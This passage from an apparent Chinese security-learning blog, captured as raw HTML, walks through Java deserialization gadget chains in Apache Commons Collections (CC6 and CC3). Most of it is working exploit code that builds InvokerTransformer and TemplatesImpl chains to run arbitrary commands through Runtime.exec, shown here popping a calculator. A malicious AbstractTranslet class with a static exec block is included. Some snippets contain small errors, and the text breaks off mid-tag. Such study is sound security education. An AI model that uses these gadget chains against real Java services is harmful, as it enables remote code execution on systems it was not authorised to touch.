class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;  <br>  <br><span class="hljs-keyword">import</span> java.io.*;  <br><span class="hljs-keyword">import</span> java.lang.reflect.Field;  <br><span class="hljs-keyword">import</span> java.util.HashMap;  <br><span class="hljs-keyword">import</span> java.util.Map;  <br>  <br><span class="hljs-comment">// CC6 链最终 EXPpublic class FinalCC6EXP &#123;  </span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;  <br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;  <br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),  <br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),  <br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),  <br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)  <br>        &#125;;  <br> <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);  <br> HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();  <br> <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(hashMap, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-string">&quot;five&quot;</span>)); <span class="hljs-comment">// 防止在反序列化前弹计算器  </span><br> <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, <span class="hljs-string">&quot;key&quot;</span>);  <br> HashMap&lt;Object, Object&gt; expMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();  <br> expMap.put(tiedMapEntry, <span class="hljs-string">&quot;value&quot;</span>);  <br> lazymap.remove(<span class="hljs-string">&quot;key&quot;</span>);<br>  <br> <span class="hljs-comment">// 在 put 之后通过反射修改值  </span><br> Class&lt;LazyMap&gt; lazyMapClass = LazyMap.class;  <br> <span class="hljs-type">Field</span> <span class="hljs-variable">factoryField</span> <span class="hljs-operator">=</span> lazyMapClass.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);  <br> factoryField.setAccessible(<span class="hljs-literal">true</span>);  <br> factoryField.set(lazyMapClass, chainedTransformer);  <br>  <br> serialize(expMap);  <br> unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);  <br> &#125;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;  <br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));  <br> oos.writeObject(obj);  <br> &#125;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;  <br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));  <br> <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();  <br> <span class="hljs-keyword">return</span> obj;  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="CC3"><a href="#CC3" class="headerlink" title="CC3"></a>CC3</h2><p>和CC1与CC6这两条链是直接在链的代码中执行任意代码相比，<strong>CC3是通过动态类加载机制来实现自动执行恶意类的代码的</strong>。</p><p>回顾一下(忘差不多了)：</p><p>实例化之前，必须先加载类的字节码文件到内存中。<code>java</code>类加载是指将类的字节码文件加载到内存中，并转换成 JVM 中的<strong>Class</strong>对象的过程。</p><p>加载类的过程中，会经历下列三个方法的调用：</p><p>(<code>ClassLoader</code> 是Java中的类加载器)</p><p><img src="/img/cc301.png" alt="cc301"></p><ul><li><code>loadClass</code> 的作用是从已加载的类缓存、父加载器等位置寻找类（这里实际上是双亲委派机制），在前面没有找到的情况下，执行 <code>findClass</code></li><li><code>findClass</code> 的作用是根据基础URL指定的方式来加载类的字节码，可能会在本地文件系统、jar包或远程http服务器上读取字节码，然后交给 <code>defineClass</code></li><li><code>defineClass</code> 的作用是处理前面传入的字节码，将其处理成真正的Java类</li></ul><p>举个利用<code>defineClass</code>执行代码的例子：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.lang.reflect.Method; <span class="hljs-comment">// 导入java.lang.reflect包中的Method类</span><br><span class="hljs-keyword">import</span> java.util.Base64; <span class="hljs-comment">// 导入java.util包中的Base64类</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloDefineClass</span> &#123; <span class="hljs-comment">// 定义一个名为HelloDefineClass的公共类</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123; <span class="hljs-comment">// 定义一个名为main的公共静态方法，抛出Exception异常</span><br>        <span class="hljs-comment">// 获取ClassLoader类的defineClass方法，并设置为可访问</span><br>        <span class="hljs-type">Method</span> <span class="hljs-variable">defineClass</span> <span class="hljs-operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="hljs-string">&quot;defineClass&quot;</span>, String.class, <span class="hljs-type">byte</span>[].class, <span class="hljs-type">int</span>.class, <span class="hljs-type">int</span>.class);<br>        defineClass.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-comment">// 使用Base64类解码经过Base64编码的字节码</span><br>        <span class="hljs-type">byte</span>[] code = Base64.getDecoder().decode(<span class="hljs-string">&quot;yv66vgAAADQAGwoABgANCQAOAA8IABAKABEAEgcAEwcAFAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApTb3VyY2VGaWxlAQAKSGVsbG8uamF2YQwABwAIBwAVDAAWABcBAAtIZWxsbyBXb3JsZAcAGAwAGQAaAQAFSGVsbG8BABBqYXZhL2xhbmcvT2JqZWN0AQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABQAGAAAAAAABAAEABwAIAAEACQAAAC0AAgABAAAADSq3AAGyAAISA7YABLEAAAABAAoAAAAOAAMAAAACAAQABAAMAAUAAQALAAAAAgAM&quot;</span>);<br><br>        <span class="hljs-comment">// 调用ClassLoader类的defineClass方法，动态定义一个类，并将结果转换为Class对象</span><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">hello</span> <span class="hljs-operator">=</span> (Class)defineClass.invoke(ClassLoader.getSystemClassLoader(), <span class="hljs-string">&quot;Hello&quot;</span>, code, <span class="hljs-number">0</span>, code.length);<br><br>        <span class="hljs-comment">// 实例化定义的类，不实例化没法调用代码</span><br>        <span class="hljs-comment">//这里直接用的defineClass方法，因为已经知道要加载的类、字节码是什么了</span><br>        hello.newInstance();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>注意，在 <code>defineClass()</code> 被调用的时候，类对象是不会被初始化的，只有这个对象显式地调用其构造函数，初始化代码才能被执行。而且，即使我们将初始化代码放在类的static块中，在 <code>defineClass()</code> 时也无法被直接调用到。<strong>所以，如果我们要使用 <code>defineClass()</code> 在目标机器上执行任意代码，需要想办法调用构造函数 <code>newInstance()</code>。</strong></p><p>可以再看一个例子：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><br><span class="hljs-comment">// 存放代码块</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> staticVar;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> instanceVar;<br><br>    <span class="hljs-keyword">static</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;静态代码块&quot;</span>);<br>    &#125;<br><br>    &#123;<br>        System.out.println(<span class="hljs-string">&quot;构造代码块&quot;</span>);<br>    &#125;<br><br>    Person()&#123;<br>        System.out.println(<span class="hljs-string">&quot;无参构造器&quot;</span>);<br>    &#125;<br>    Person(<span class="hljs-type">int</span> instanceVar)&#123;<br>        System.out.println(<span class="hljs-string">&quot;有参构造器&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">staticAction</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;静态方法&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/cc302.png" alt="cc302"></p><p>这里如果把<code>newclass.newInstance()</code>注释掉(即只加载不进行实例化)会发现没有任何输出。</p><p>下面就是文章中的利用类：</p><p>首先，<code>TemplatesImpl.java</code>下存在<code>defineClass</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">Class <span class="hljs-title function_">defineClass</span><span class="hljs-params">(<span class="hljs-keyword">final</span> <span class="hljs-type">byte</span>[] b)</span> &#123;<br>        <span class="hljs-keyword">return</span> defineClass(<span class="hljs-literal">null</span>, b, <span class="hljs-number">0</span>, b.length);<br>    &#125;<br></code></pre></td></tr></table></figure><p>但注意这是被<code>default</code>修饰的，继续找有没有地方调用了他：</p><p><img src="/img/cc303.png" alt="cc303"></p><p>同一个类下的 <code>getTransletInstance()</code> 方法调用了 <code>defineTransletClasses()</code> 方法，并且这里有一个 <code>newInstance()</code> 实例化的过程，如果能走完这个函数那么就能动态执行代码:</p><p><img src="/img/cc304.png" alt="cc304"></p><p>这里可能会想：</p><p>这不是对<code>_class[_transletIndex].newInstance();</code>调用<code>newInstance()</code>吗？</p><p>可以看看这个东西是个啥：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; classCount; i++) &#123;<br>           _class[i] = loader.defineClass(_bytecodes[i]);<br></code></pre></td></tr></table></figure><p>然后存在一个<code>public</code>修饰的方法：<code>newTransformer</code></p><p><img src="/img/cc305.png" alt="cc305"></p><h4 id="如何利用？"><a href="#如何利用？" class="headerlink" title="如何利用？"></a>如何利用？</h4><p>根据上面的分析我们知道：最终目标就是调用<code>templates.java</code>下的<code>newTransformer()</code>方法</p><p>大致调用顺序：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">TemplatesImpl templates = <span class="hljs-keyword">new</span> <span class="hljs-constructor">TemplatesImpl()</span>;<br>templates.<span class="hljs-keyword">new</span><span class="hljs-constructor">Transformer()</span>;  <br>newTransformer -&gt; getTransletInstance<br>    -&gt; define<span class="hljs-constructor">TransletClasses()</span> <span class="hljs-comment">//并且存在实例化:</span><br>    -&gt; AbstractTranslet translet = (AbstractTranslet) _class<span class="hljs-literal">[<span class="hljs-identifier">_transletIndex</span>]</span>.<span class="hljs-keyword">new</span><span class="hljs-constructor">Instance()</span>;<br>    注意：<br>    define<span class="hljs-constructor">TransletClasses()</span> -&gt;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> i = <span class="hljs-number">0</span>; i &lt; classCount; i++) &#123;<br>                _class<span class="hljs-literal">[<span class="hljs-identifier">i</span>]</span> = loader.define<span class="hljs-constructor">Class(<span class="hljs-params">_bytecodes</span>[<span class="hljs-params">i</span>])</span>;<br>                <span class="hljs-comment">//defineclass只是加载类没有执行，加载完了执行才能触发类的动态加载：恶意代码</span><br></code></pre></td></tr></table></figure><p>先看看调用<code>getTransletInstance</code>下的<code>defineTransletClasses()</code>得满足啥条件：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> Translet <span class="hljs-title function_">getTransletInstance</span><span class="hljs-params">()</span><br>        <span class="hljs-keyword">throws</span> TransformerConfigurationException &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">if</span> (_name == <span class="hljs-literal">null</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br><br>            <span class="hljs-keyword">if</span> (_class == <span class="hljs-literal">null</span>) defineTransletClasses();<br></code></pre></td></tr></table></figure><ul><li><code>_name</code>为<code>null</code>，则直接<code>return null</code></li><li><code>_classs</code> 为<code>null</code>，调用 <code>newInstance()</code></li></ul><p>先看一眼无参构造函数吧，都怎么赋值的：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">TemplatesImpl</span><span class="hljs-params">()</span> &#123; &#125; <span class="hljs-comment">//空的</span><br></code></pre></td></tr></table></figure><p>然后再看看<code>defineTransletClasses()</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">defineTransletClasses</span><span class="hljs-params">()</span><br>    <span class="hljs-keyword">throws</span> TransformerConfigurationException &#123;<br><br>    <span class="hljs-keyword">if</span> (_bytecodes == <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-type">ErrorMsg</span> <span class="hljs-variable">err</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ErrorMsg</span>(ErrorMsg.NO_TRANSLET_CLASS_ERR);<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerConfigurationException</span>(err.toString());<br>    &#125; <span class="hljs-comment">//所以这里_bytecodes得是空的</span><br>    <br>    <span class="hljs-type">TransletClassLoader</span> <span class="hljs-variable">loader</span> <span class="hljs-operator">=</span> (TransletClassLoader)<br>        AccessController.doPrivileged(<span class="hljs-keyword">new</span> <span class="hljs-title class_">PrivilegedAction</span>() &#123;<br>            <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">run</span><span class="hljs-params">()</span> &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransletClassLoader</span>(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());<br>            &#125;<br>        &#125;);<span class="hljs-comment">//注意这个_tfactory，他不能为空</span><br></code></pre></td></tr></table></figure><p>看图的话方便点：(DB师傅的图)</p><p><img src="/img/cc306.png" alt="cc306"></p><p>接下来看看<code>defineTransletClasses</code>如何利用：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; classCount; i++) &#123;<br>                _class[i] = loader.defineClass(_bytecodes[i]);<br></code></pre></td></tr></table></figure><p>看看这个<code>_bytecodes</code>该如何定义：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-type">byte</span>[][] _bytecodes = <span class="hljs-literal">null</span>;<br></code></pre></td></tr></table></figure><p>这沟槽的是个二维数组，所以：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Field</span> <span class="hljs-variable">bytecodefield</span> <span class="hljs-operator">=</span> temp1.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br><br>classfield.setAccessible(<span class="hljs-literal">true</span>);<br><br><span class="hljs-type">byte</span> [] byte1 =  Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;E://Clac.class&quot;</span>));<br><br><span class="hljs-type">byte</span> [] [] evil = &#123;byte1&#125;;<br><br>bytecodefield.set(temp1,evil);<br></code></pre></td></tr></table></figure><p><code>defineTransletclasses</code>下存在如下限制：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">defineTransletClasses</span><span class="hljs-params">()</span><br>        <span class="hljs-keyword">throws</span> TransformerConfigurationException &#123;<br><br>        <span class="hljs-keyword">if</span> (_bytecodes == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-type">ErrorMsg</span> <span class="hljs-variable">err</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ErrorMsg</span>(ErrorMsg.NO_TRANSLET_CLASS_ERR);<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerConfigurationException</span>(err.toString());<br>        &#125;<br>........<br>                    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransletClassLoader</span>(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());<br>                &#125;<br>            &#125;);<br></code></pre></td></tr></table></figure><p>这里的<code>_tfactory</code>绝不能为空。<code>_tfactory</code> 的值在 <code>TemplatesImpl</code> 这一类中被定义如下，关键字是 <code>transient</code>，这里进行了字段初始化：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">transient</span> <span class="hljs-type">TransformerFactoryImpl</span> <span class="hljs-variable">_tfactory</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br></code></pre></td></tr></table></figure><p>他不光为<code>null</code>，而且被<code>transient</code>修饰。这东西在序列化过程中都不会被传进去。不过在<code>readObject</code>方法中已经给他付了一个值：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span>  <span class="hljs-title function_">readObject</span><span class="hljs-params">(ObjectInputStream is)</span><br>      <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException<br><span class="hljs-comment">//省略</span><br>        _tfactory = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>();<br>    &#125;<br></code></pre></td></tr></table></figure><p>所以这里不管他就行，反正到时候反序列化会自动给个值。</p><p>先不着急序列化反序列化，调用<code>newTransformer</code>方法看看能不能打通。我们这里利用反射得给他赋成readObject时的值：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);  <br>tfactoryField.setAccessible(<span class="hljs-literal">true</span>);  <br>tfactoryField.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br></code></pre></td></tr></table></figure><p>截止到目前的EXP:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs JAVA"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TemplatesImplEXP</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;  <br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();  <br> <span class="hljs-type">Class</span> <span class="hljs-variable">templatesClass</span> <span class="hljs-operator">=</span> templates.getClass();  <br> <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);  <br> nameField.setAccessible(<span class="hljs-literal">true</span>);  <br> nameField.set(templates,<span class="hljs-string">&quot;Drunkbaby&quot;</span>);  <br>  <br> <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);  <br> bytecodesField.setAccessible(<span class="hljs-literal">true</span>);  <br> <span class="hljs-type">byte</span>[] evil = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;E://Calc.class&quot;</span>));  <br> <span class="hljs-type">byte</span>[][] codes = &#123;evil&#125;;  <br> bytecodesField.set(templates,codes);  <br>  <br> <span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);  <br> tfactoryField.setAccessible(<span class="hljs-literal">true</span>);  <br> tfactoryField.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());  <br> templates.newTransformer();  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p>但这个时候会报空指针错，解决办法(参考DB师傅的图)：</p><p><img src="/img/Debug.png" alt="Debug"></p><ul><li>418 行，判断在 <code>defineClass()</code> 方法中传进去的参数 b 数组的字节码是否继承了 <code>ABSTRACT_TRANSLET</code> 这个父类，如果没有则抛出异常，所以我们需要去恶意类中继承 <code>ABSTRACT_TRANSLET</code> 这个父类。</li></ul><p>注意这是个抽象类，里面的抽象方法都得实现：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Clac</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException var1) &#123;<br>            var1.printStackTrace();<br>        &#125;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>再执行就可以弹计算器了：</p><p><img src="/img/cc308.png" 